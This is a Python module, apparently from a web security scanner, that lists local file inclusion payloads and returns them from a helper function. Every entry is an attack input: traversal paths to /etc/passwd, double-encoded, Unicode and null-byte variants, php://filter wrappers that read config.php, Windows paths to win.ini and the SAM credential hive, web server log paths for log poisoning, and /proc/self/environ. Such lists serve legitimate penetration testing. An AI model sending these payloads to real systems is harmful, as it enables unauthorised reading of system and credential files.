"""Extended LFI payloads with encoding variants."""

LFI_PAYLOADS = [
    # Basic path traversal
    '../../../../etc/passwd',
    '../../../etc/passwd',
    '../../etc/passwd',
    
    # Double encoding
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    
    # Unicode/UTF-8 encoding
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
    
    # Null byte injection
    '../../../../etc/passwd%00',
    '../../../etc/passwd%00.txt',
    '../../../../etc/passwd\\x00',
    
    # Nested traversal
    '....//....//....//etc/passwd',
    '..\\/..\\/..\\/etc/passwd',
    
    # With wrapper
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://filter/read=convert.base64-encode/resource=../../etc/passwd',
    'php://filter/convert.base64-encode/resource=../config.php',
    
    # Windows paths
    '..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\windows\\system32\\config\\SAM',
    
    # Log poisoning paths
    '/var/log/apache2/access.log',
    '/var/log/apache/access.log',
    '/var/log/nginx/access.log',
    '/var/log/httpd/access_log',
    
    # Proc filesystem
    '/proc/self/environ',
    '/proc/self/fd/0',
    '/proc/self/cmdline',
]


def get_lfi_payloads() -> list[str]:
    """Get extended LFI payloads."""
    return list(LFI_PAYLOADS)
